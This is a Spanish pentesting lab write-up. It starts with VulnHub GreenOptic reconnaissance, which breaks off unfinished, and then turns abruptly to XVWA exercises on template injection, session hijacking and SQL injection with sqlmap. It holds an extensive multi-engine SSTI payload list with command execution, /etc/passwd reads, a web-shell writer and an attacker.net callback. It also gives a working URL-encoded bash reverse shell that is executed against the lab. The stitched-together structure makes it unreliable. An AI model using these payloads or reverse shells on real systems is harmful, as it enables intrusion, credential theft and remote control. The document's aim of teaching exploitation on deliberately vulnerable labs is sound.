# Descargar la maquina CTF desde 
```
https://www.vulnhub.com/entry/greenoptic-1,510/
```

# 1. RECONOCIMIENTO
-------------------------------------------------------------------
Se realizará la recopilación de toda la información posible como direcciones IP, nombres de dominios, información de contactos, servicios públicos disponibles en la página. Se dividirá en escaneo de puertos, enumeración de servicios, enumeración de grupos y permisos, enumeración de nombres de dominio.

Escaneo con netdiscover, para encontrar la IP valida de la máquina.
> netdiscover -r 192.168.115.0/24

![image](https://github.com/lidiaelopezh/pucp-hacking/blob/463dc77a285fdcaf1a56ff5299964e7b87b5bd5b/images/Imagen1.png)

Escaneo de host en una misma red.
> nmap -sn 192.168.115.0/24

Escaneo de puertos en el host con IP 192.168.115.149 de GreenOptic. Detectando el SO, versiones de software, scripts y traceroute
> nmap -O 192.168.115.149

> nmap -sV 192.168.115.149

Realizando un escaneo más completo de puertos:
> nmap -T4 -A -v -p- 192.168.115.149 -oA greenOptic.txt

# 2. ANÁLISIS DE VULNERABILIDADES
-------------------------------------------------------------------
Evaluaremos cuales pueden ser las vulnerabilidades potenciales obtenidas de los escaneos previos, así como de la revisión de los servicios encontrados. Tratando de abrir el servicio de cada puerto, obtenido del resultado del escaneo con nmap.

Analizamos las componentes de la página web que está en la IP 192.168.115.149. Se revisa y se encuentra que:
- Probador de conectividad en el que puedes introducir tu código postal o el número de teléfono fijo.
- Formulario de contacto en la parte inferior de la página.


En el Puerto 21:
> ftp 192.168.115.149


En el Puerto 10000 se encuentra el servicio de webmin, así que abrimos en el navegador:
> 192.168.115.149:10000

Da un error, asi que se agrega el dominio brindado en el host local 
> cat /etc/hosts

> nano /etc/hosts
192.168.115.149 websrv01.greenoptic.vm
192.168.115.149 greenoptic.vm

Volviendo a cargar la página, se obtiene:








Supongamos que desarrollaste una aplicación web en Python que saluda al usuario al momento de ingresar y la URL es la siguiente:

![image](https://user-images.githubusercontent.com/50930193/171758045-48c1948a-f9dd-43b3-a6fb-ccfceb7e5c18.png)

Y, lamentablemente, utiliza una plantilla de código vulnerable que incorpora la entrada del usuario para después renderizar la plantilla.

![image](https://user-images.githubusercontent.com/50930193/171758087-c43f6e17-03ec-4cd2-ba07-bfbecde51d37.png)


Internamente tu aplicación recoge el parámetro nombre de la URL y te da la bienvenida “Hola Kevin”. Sin embargo, **la aplicación solo recoge lo que pone el usuario en la URL sin hacerle ningún tipo de tratamiento.** 

En este caso, un atacante podría aprovechar la vulnerabilidad para colocar su código de Python:

![image](https://user-images.githubusercontent.com/50930193/171758168-6a5961bc-567f-4f5d-9b26-dceafc86c75a.png)

Así podría importar la librería del sistema (import os) y ejecutar el comando whoami directamente en el sistema operativo

Veamos como funciona en XVWA, elija la opción **Server Side Template Injection** desde el menu

![image](https://user-images.githubusercontent.com/50930193/171759972-9b50b269-92f2-4657-90e8-679962e35b41.png)

En la caja de texto ingrese ël valor 

```
{{7*7}}
```
y presione el botón submit

![image](https://user-images.githubusercontent.com/50930193/171759951-1dfde684-063e-4a69-a984-fffcfdba3827.png)

ello es posible porque internamente el código maneja un motor de plantillas, una manera de identificar las plantilla es necesario inyectar operaciones matemáticas arbitrarias usando la sintaxis de diferentes motores de plantillas. Para identificar que plantilla podría usarse se puede utilizar un árbol de decisión similar al siguiente:

![image](https://user-images.githubusercontent.com/50930193/171760298-32e92dde-c976-4ac4-83b5-5a91abcefed8.png)

o en su defecto esperar emplear esta entrada de datos que como en el siguiente ejemplo te indica que el template es **django**

```
${{<%[%'"}}%\.
```
![image](https://user-images.githubusercontent.com/50930193/171760941-308979f8-b945-400f-aa7d-e02a0976231d.png)

Algunos valores que se pueden usar después que el template ha sido identificado es el siguiente
```
-------------------------------------------------------------------
Polyglot:
${{<%[%'"}}%\
-------------------------------------------------------------------
FreeMarker (Java):
${7*7} = 49
<#assign command="freemarker.template.utility.Execute"?new()> ${ command("cat /etc/passwd") }
--------------------------------------------------------------------
(Java):
${7*7}
${{7*7}}
${class.getClassLoader()}
${class.getResource("").getPath()}
${class.getResource("../../../../../index.htm").getContent()}
${T(java.lang.System).getenv()}
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}
--------------------------------------------------------------------
Twig (PHP):
{{7*7}}
{{7*'7'}}
{{dump(app)}}
{{app.request.server.all|join(',')}}
"{{'/etc/passwd'|file_excerpt(1,30)}}"@
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
--------------------------------------------------------------------
Smarty (PHP):
{$smarty.version}
{php}echo `id`;{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
-------------------------------------------------------------------
Handlebars (NodeJS):
wrtz{{#with "s" as |string|}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return require('child_process').exec('whoami');"}}
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{{/each}}
{{/with}}
{{/with}}
{{/with}}
{{/with}}
-------------------------------------------------------------------
Velocity:
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
-------------------------------------------------------------------
ERB (Ruby):
<%= system("whoami") %>
<%= Dir.entries('/') %>
<%= File.open('/example/arbitrary-file').read %>
-------------------------------------------------------------------
Django Tricks (Python):
{% debug %}
{{settings.SECRET_KEY}}
--------------------------------------------------------------------
Tornado (Python):
{% import foobar %} = Error
{% import os %}{{os.system('whoami')}}
--------------------------------------------------------------------
Mojolicious (Perl):
<%= perl code %>
<% perl code %>
-------------------------------------------------------------------
Flask/Jinja2: Identify:
{{ '7'*7 }}
{{ [].class.base.subclasses() }} # get all classes
{{''.class.mro()[1].subclasses()}}
{%for c in [1,2,3] %}{{c,c,c}}{% endfor %}
-------------------------------------------------------------------
Flask/Jinja2: 
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
--------------------------------------------------------------------
Jade:
#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
--------------------------------------------------------------------
Razor (.Net):
@(1+2)
@{// C# code}
--------------------------------------------------------------------
```
mayor información de valores que generan inyección puede ingresar a esta ruta [SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)

Volvamos a XVWA y ahora en la caja de texto vamos a ingresar lo siguiente

```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```
![image](https://user-images.githubusercontent.com/50930193/171770500-3f90b86a-c99a-4bab-bff9-a6513f210463.png)

Allí notamos que se puede ejecutar un comando en el servidor, ahora leamos el archivo de usuarios
```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /etc/passwd")}}
```
Nos saldra error pero si lo codificamos veremos que el error no se presenta
```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat+/etc/passwd")}}
```
![image](https://user-images.githubusercontent.com/50930193/171771057-2142e593-1498-4102-99a2-8b26801ad30e.png)

Intentemos con una shell reversa en bash
```
bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'
```
Codificamos el URL, abrimos un netcat y ejecutamos y obtenemos una shell
```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("bash+-c+'exec+bash+-i+%26>/dev/tcp/192.168.109.128/1234+<%261'")}}
```
![image](https://user-images.githubusercontent.com/50930193/171772173-3948f444-e88b-4712-8ce4-847508c5add6.png)

# Session Flaws 
-------------------------------------------------------------------

Las aplicaciones web requieren una mejor gestión de la sesión para seguir el estado de la aplicación y las actividades de los usuarios. La gestión de sesiones insegura puede dar lugar a ataques como la predicción de sesiones, el secuestro, la fijación y los ataques de reproducción.

Ingresemos desde dos sitios diferentes al enlace del xvwa, ingresemos con dos perfiles diferentes, para ello emplee las credenciales siguientes:
```
admin:admin
xvwa:xvwa
```

Ingreso con xvwa
![image](https://user-images.githubusercontent.com/50930193/171877841-d38d33cb-5555-451c-84b2-90f48e62c582.png)

Ingreso con admin
![image](https://user-images.githubusercontent.com/50930193/171878317-01674c6f-2576-415e-a6e4-cbc51f635446.png)

El robo de sesión puede ser a través de cookies o interceptación con Burpsuite, para ello de la sesión con xvwa haga el cambio el valor que cambia es el del 

![image](https://user-images.githubusercontent.com/50930193/171882963-0bb30c70-09f8-43e6-ae6a-c5ce2d8357a0.png)

Ahora presione **Execute** y observarás que la sesión se ha robado 

![image](https://user-images.githubusercontent.com/50930193/171883526-56108715-93d1-4e21-8393-00a8ac0aabc9.png)

Se evidencia una vulnerabilidad 

# SQL Inyection 
-------------------------------------------------------------------
La inyección de SQL ocurre cuando la aplicación web interactúa con la base de datos y utiliza la entrada proporcionada por el usuario para construir dinámicamente consultas SQL sin suficiente validación. 

Usemos Xtreme Vulnerable Web Application (XVWA) y naveguemos hasta SQL Injection. 

![image](https://user-images.githubusercontent.com/50930193/171903498-2f20bc99-e288-4856-b0c3-8d9d44c7490d.png)
 
Un usuario puede buscar artículos seleccionando el Código de artículo o ingresando algún texto en el campo de búsqueda . Verifiquemos si el campo de búsqueda es vulnerable a la inyección de SQL. 

Ingresemos una comilla simple en el campo de búsqueda y observemos la respuesta. 

![image](https://user-images.githubusercontent.com/50930193/171903894-9aa18821-ca99-405c-961b-def77a1e84e4.png)

Como podemos notar, hay un error de SQL. Este error se produjo porque la comilla simple se anexa a la consulta SQL existente escrita en la aplicación web y se deja sin cerrar. Puede verse de la siguiente manera.

```
select * from caffaine where itemid = ';
 ```

Ahora, ingresemos dos comillas simples y observemos la respuesta.

![image](https://user-images.githubusercontent.com/50930193/171904007-84526510-67fc-4c66-a09c-462acb5288c6.png)


Como podemos notar, no hay ningún error de SQL esta vez. Hemos proporcionado dos comillas simples y posiblemente se agreguen a la consulta SQL existente. Sin embargo, la consulta no se deja sin cerrar ya que pasamos dos cotizaciones. Esto puede tener el siguiente aspecto.
```
select * from caffaine where itemid = '';
 ```

A continuación, uno puede interceptar el código e incluir sentencias sql 

![image](https://user-images.githubusercontent.com/50930193/171906370-13d782e1-9dd1-431c-b977-dd5526af9f9b.png)



Una forma de averiguar el número de columnas es usar una instrucción order by. En XVWA, podemos observar que las declaraciones de order by 8 arrojan el siguiente error, pero cualquier orden de order by 1 a order by 7 no arroja ningún error. Esto confirma que hay 7 columnas en la consulta.

![image](https://user-images.githubusercontent.com/50930193/171906828-14a4b692-d859-47e8-b809-119f0f3bbd8c.png)


Ahora, podemos hacer uso de este conocimiento para escribir declaraciones SELECT como se muestra a continuación. Dado que sabemos que hay 7 columnas en la consulta existente, nuestra declaración de selección también incluye 7 columnas, como se muestra a continuación.
 ```
1' union select 1,2,3,4,5,6,7 #
 ```
![image](https://user-images.githubusercontent.com/50930193/171908638-0ba85e59-a743-4472-bd82-f748bf0725d3.png)

Al ejecutar esta consulta, se mostrarán algunos de los números utilizados en nuestra consulta, que a su vez se pueden usar más adelante para extraer información de la base de datos, en ese sentido, hay algunas columnas que se muestran en la página web. Usemos la columna 2 para mostrar información de la base de datos. La siguiente entrada obtendrá el nombre de la base de datos que se está utilizando.

1' union select 1,database(),3,4,5,6,7 #

![image](https://user-images.githubusercontent.com/50930193/171909178-517bc851-6de6-46b9-9341-0d6cba7ae63e.png)

Para mayor información de ayuda en sql injection pueden ingresar al siguiente enlace [github de opensec] (https://github.com/Open-Sec/Open-SecTraining/blob/master/SQLi-Recetario.txt)

Como podemos notar, podríamos mostrar el nombre de la base de datos. De manera similar, la siguiente entrada obtendrá la lista de tablas de la base de datos.
```
 1' union select 1,2,3,4,table_name,6,7 from information_schema.tables#
```

La salida se ve de la siguiente manera.

![image](https://user-images.githubusercontent.com/50930193/171911445-1823eaa7-79ac-45f9-a28c-035534504ef5.png)

o bien desde Burpsuite

![image](https://user-images.githubusercontent.com/50930193/171912166-005e09bb-3165-489e-962f-c6c88800f88b.png)


Como habrás notado, la extracción manual de datos usando SQL Injection puede llevar mucho tiempo a veces y puede volverse extremadamente difícil cuando se trata de Blind SQL Injection. Aquí es donde podemos confiar en herramientas automatizadas que pueden acelerar el proceso de explotación. 


### Explotación automatizada usando sqlmap:

Ahora, analicemos cómo podemos usar sqlmap para automatizar la detección y explotación de SQL Injection. 

Interceptomos la información con Burp

![image](https://user-images.githubusercontent.com/50930193/171912538-f36f100c-d581-4605-bfd1-e6172ebc5347.png)
 
```
POST /xvwa/vulnerabilities/sqli/ HTTP/1.1
Host: 192.168.109.208
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 14
Origin: http://192.168.109.209
Connection: close
Referer: http://192.168.109.209/xvwa/vulnerabilities/sqli/
Upgrade-Insecure-Requests: 1
Cookie: PHPSESSID=5302d42dc8f560a0103a93c791292bf0

item=&search=1
```
Guarde esta solicitud en un archivo. En este caso, se guarda como **sqli.txt** y desde una nueva terminal ejecute lo siguiente.

```
sqlmap -r sqli.txt -p search –dbms=mysql --dbs
```
El comando anterior inicia sqlmap y toma sqli.txt como entrada. Estamos usando -p para especificar que la búsqueda es el lugar donde sqlmap debe inyectar sus cargas útiles. –dbs es el indicador que le dice a sqlmap que obtenga las bases de datos disponibles.

Después de ejecutar el comando, debería ver la siguiente ventana.
![image](https://user-images.githubusercontent.com/50930193/171914916-b57079ea-3cec-476a-9f3a-5979cf1fe52e.png)

Podemos ver los resultados de dicha búsqueda
![image](https://user-images.githubusercontent.com/50930193/171914970-50955c5d-73cf-482f-a995-796105153dd5.png)


La base de datos xvwa parece interesante. Entonces, elijamos la base de datos xvwa y busquemos tablas usando el siguiente comando.

```
sqlmap -r sqli.txt -p search –dbms=mysql -D xvwa --tables
```

Después de ejecutar el comando anterior, deberíamos poder ver los siguientes nombres de tabla de la base de datos xvwa.

![image](https://user-images.githubusercontent.com/50930193/171917148-7dda4eef-6f2b-47ee-a304-7e2ef5d33583.png)

Del paso anterior, podemos ver que tenemos tres tablas. Extraigamos los nombres de las columnas de la tabla users . Ejecutemos el siguiente comando.

```
sqlmap -r sqli.txt -p search –dbms=mysql -D xvwa –T users --columns
``` 
El comando anterior obtendrá todos los nombres de columna de los usuarios de la tabla .

![image](https://user-images.githubusercontent.com/50930193/171917651-81bcc57b-d555-49e5-8bf5-486a4a4a79b9.png)

 Como podemos notar, tenemos tres columnas diferentes. 

Finalmente, necesitamos volcar todos los datos de la tabla users . Podemos hacerlo usando el siguiente comando.

```
sqlmap -r sqli.txt -p search –dbms=mysql -D xvwa –T users --dump
```
 
El siguiente extracto muestra que los hashes están descifrados y las contraseñas de texto claro se muestran junto a sus hashes.

![image](https://user-images.githubusercontent.com/50930193/171918574-ac07a128-9afb-4509-a48e-1f11a57bfb90.png)
